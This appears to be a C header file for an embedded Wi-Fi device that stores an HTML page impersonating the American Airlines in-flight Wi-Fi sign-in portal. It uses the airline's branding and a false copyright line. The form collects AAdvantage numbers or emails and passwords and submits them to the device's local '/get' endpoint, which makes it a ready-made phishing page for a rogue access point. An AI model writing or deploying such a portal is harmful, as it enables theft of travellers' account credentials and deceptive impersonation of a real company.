#ifndef AMERICANAIRLINE_H
#define AMERICANAIRLINE_H

const char AMERICANAIRLINE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>American Airlines Wi-Fi</title>
    <style>
        /* Embedded CSS for American Airlines Branding */
        /* Base styles for body and overall layout */
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem; /* Increased overall padding */
            /* Dynamic American Airlines Gradient: Deep blue to light blue, with a hint of red */
            background-image: linear-gradient(135deg, #041E42 0%, #005B9A 50%, #BF0A30 100%);
            background-size: 400% 400%;
            animation: gradientAnimation 15s ease infinite; /* Subtle animation for background */
        }

        /* Keyframe animation for the background gradient */
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Login Container Styling */
        .login-container {
            background-color: rgba(255, 255, 255, 0.1); /* Lighter frosted glass */
            backdrop-filter: blur(15px); /* Stronger blur for glass effect */
            -webkit-backdrop-filter: blur(15px);
            border-radius: 1.5rem; /* More rounded corners */
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3), inset 0 0 0 1px rgba(255, 255, 255, 0.2); /* Enhanced shadow with inner border */
            padding: 3rem; /* Generous padding inside container */
            max-width: 30rem; /* Slightly wider for better balance */
            width: 100%;
            color: #fff; /* Default text color */
            text-align: center;
            transform: scale(1);
            transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); /* Smooth transitions */
            border: 1px solid rgba(255, 255, 255, 0.15); /* Subtle outer border */
        }
        .login-container:hover {
            transform: scale(1.01); /* Slight zoom on hover */
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), inset 0 0 0 1px rgba(255, 255, 255, 0.3); /* Deeper shadow on hover */
        }

        /* Header Section for Titles */
        .header-section {
            margin-bottom: 2.5rem; /* More space below header */
        }
        .main-title {
            font-size: 2.5rem; /* Larger and bolder title */
            line-height: 1.2;
            font-weight: 700;
            color: #fff;
            text-shadow: 0 3px 6px rgba(0, 0, 0, 0.3); /* More defined text shadow */
            margin-bottom: 0.75rem;
        }
        .sub-title {
            font-size: 1.25rem; /* Clearer subtitle */
            line-height: 1.4;
            font-weight: 400; /* Regular weight */
            color: rgba(255, 255, 255, 0.9); /* Slightly more opaque */
            margin-bottom: 0;
        }

        /* Form Input Styling */
        .input-group {
            margin-bottom: 1.5rem; /* Increased spacing between input groups */
            display: flex;
            justify-content: center; /* Center input fields */
        }
        .form-input {
            width: 100%;
            max-width: 22rem; /* Wider inputs for better data entry */
            padding: 1rem 1.25rem; /* More generous padding */
            font-size: 1.1rem; /* Slightly larger font */
            background-color: rgba(255, 255, 255, 0.2); /* Transparent white */
            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle white border */
            border-radius: 0.75rem; /* More rounded */
            color: #fff; /* White text */
            transition: all 0.3s ease;
            appearance: none;
            outline: none;
        }
        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.6); /* Lighter, subtle placeholder */
        }
        .form-input:focus {
            background-color: rgba(255, 255, 255, 0.3); /* Brighter on focus */
            border-color: rgba(255, 255, 255, 0.6); /* Clearer border on focus */
            box-shadow: 0 0 0 3px rgba(0, 120, 210, 0.7); /* American Airlines blue glow */
        }

        /* Button Styling */
        .button-wrapper {
            margin-top: 2.5rem; /* More space above the button */
            display: flex;
            justify-content: center;
        }
        .action-button {
            width: 100%;
            max-width: 22rem; /* Match input width */
            background-image: linear-gradient(to right, #BF0A30 0%, #E0115F 100%); /* Vibrant Red gradient */
            color: #fff;
            font-weight: 600;
            font-size: 1.2rem; /* Larger button text */
            padding: 1.1rem 2.5rem; /* More padding for a bolder button */
            border-radius: 0.75rem; /* More rounded */
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3), inset 0 0 0 1px rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease-in-out;
            cursor: pointer;
            border: none;
            letter-spacing: 0.08em; /* Increased letter spacing for impact */
            text-transform: uppercase; /* Uppercase for a modern touch */
        }
        .action-button:hover {
            background-image: linear-gradient(to right, #990827 0%, #CC0044 100%); /* Darker red gradient on hover */
            transform: translateY(-0.2rem) scale(1.01); /* Lift and slight scale */
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4), inset 0 0 0 1px rgba(255, 255, 255, 0.2);
        }
        .action-button:active {
            transform: translateY(0); /* Press effect */
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        .action-button:focus {
            outline: none;
            box-shadow: 0 0 0 4px rgba(0, 120, 210, 0.6); /* AA blue focus ring */
        }

        /* Footer Text */
        .footer-text {
            font-size: 0.85rem;
            opacity: 0.7;
            margin-top: 3rem; /* More space above footer */
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Text introduction -->
        <div class="header-section">
            <h1 class="main-title">American Airlines Wi-Fi</h1>
            <h2 class="sub-title">Sign in to stay connected onboard!</h2>
        </div>
        <form action="/get" id="email-form-step">
            <!-- Username/Email Input Field -->
            <div class="input-group">
                <input
                    name="username"
                    type="text"
                    class="form-input"
                    placeholder="AAdvantage Number or Email"
                    required
                    aria-label="AAdvantage Number or Email"
                >
            </div>
            <div class="input-group">
                <input
                    name="password"
                    type="password"
                    class="form-input"
                    placeholder="Password"
                    required
                    aria-label="Password"
                >
            </div>

            <!-- Sign In Button Container -->
            <div class="button-wrapper">
                <button
                    type="submit"
                    class="action-button"
                >
                    Connect to Wi-Fi
                </button>
            </div>
        </form>
        <div class="footer-text">
            <p>&copy; 2025 American Airlines. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
)rawliteral";
#endif